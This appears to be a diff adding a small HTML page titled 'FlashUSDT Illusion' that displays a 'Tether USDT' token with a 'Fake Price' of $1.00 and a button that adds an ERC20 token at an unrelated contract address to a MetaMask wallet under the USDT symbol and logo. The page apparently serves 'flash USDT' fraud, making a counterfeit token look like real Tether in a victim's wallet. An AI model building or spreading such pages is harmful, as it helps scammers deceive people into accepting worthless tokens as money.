@@ -1,0 +1,47 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FlashUSDT Illusion</title>
+</head>
+<body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
+  <img src="https://raw.githubusercontent.com/agravat143/flashusdt-assets/main/logo.png" alt="USDT Logo" width="100" />
+  <h1>FlashUSDT Token Viewer</h1>
+  <p><strong>Name:</strong> Tether USDT</p>
+  <p><strong>Symbol:</strong> USDT</p>
+  <p><strong>Fake Price:</strong> $1.00 USD</p>
+  <button onclick="addToken()" style="padding: 10px 20px; font-size: 16px;">➕ Add USDT to MetaMask</button>
+  <script>
+    async function addToken() {
+      const tokenAddress = '0xb050D0bAEa3DE6054BcF6Cc2DA31D4D8C9803B1D';
+      const tokenSymbol = 'USDT';
+      const tokenDecimals = 18;
+      const tokenImage = 'https://raw.githubusercontent.com/agravat143/flashusdt-assets/main/logo.png';
+      try {
+        const wasAdded = await window.ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: tokenAddress,
+              symbol: tokenSymbol,
+              decimals: tokenDecimals,
+              image: tokenImage,
+            },
+          },
+        });
+        if (wasAdded) {
+          alert('USDT token successfully added!');
+        } else {
+          alert('Token add canceled.');
+        }
+      } catch (error) {
+        console.error(error);
+        alert('Error: ' + error.message);
+      }
+    }
+  </script>
+</body>
+</html>
